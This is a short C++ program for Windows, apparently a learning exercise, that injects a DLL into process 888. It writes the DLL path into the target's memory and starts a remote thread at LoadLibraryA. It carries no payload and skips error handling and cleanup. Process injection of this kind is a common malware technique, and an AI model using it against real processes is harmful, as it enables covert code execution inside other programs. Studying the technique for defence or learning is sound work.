#include <Windows.h>

int main() {
	LPCSTR dllPath = "C:\\Users\\Abolfazl\\source\\repos\\"
					"SimpleDll_Injection\\x64\\Debug\\SharedCodeTest.dll";
	const int processId = 888;
	const int bufferLen = strlen(dllPath) + 1;

	//1) Attach to the process
	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS,
		FALSE,
		processId);

	//2) Buffer creation
	LPVOID remoteBufferAddr = VirtualAllocEx(procHandle,
		nullptr,
		bufferLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	//3) Copying data to the remote process	
	SIZE_T writtenBytes;
	WriteProcessMemory(procHandle, remoteBufferAddr,
		dllPath, bufferLen,
		&writtenBytes);

	//Getting LoadLibrary Address
	FARPROC loadLibAddr = GetProcAddress(GetModuleHandleA("Kernel32.dll"), 
		"LoadLibraryA");
	//4) Create a remote thread for code execution which calls LoadLibraryA
	HANDLE threadHandle = CreateRemoteThread(procHandle,
		nullptr, 0,
		(LPTHREAD_START_ROUTINE)loadLibAddr, remoteBufferAddr,
		0, nullptr);

	//DO Close handle & cleanup
	return 0;
}
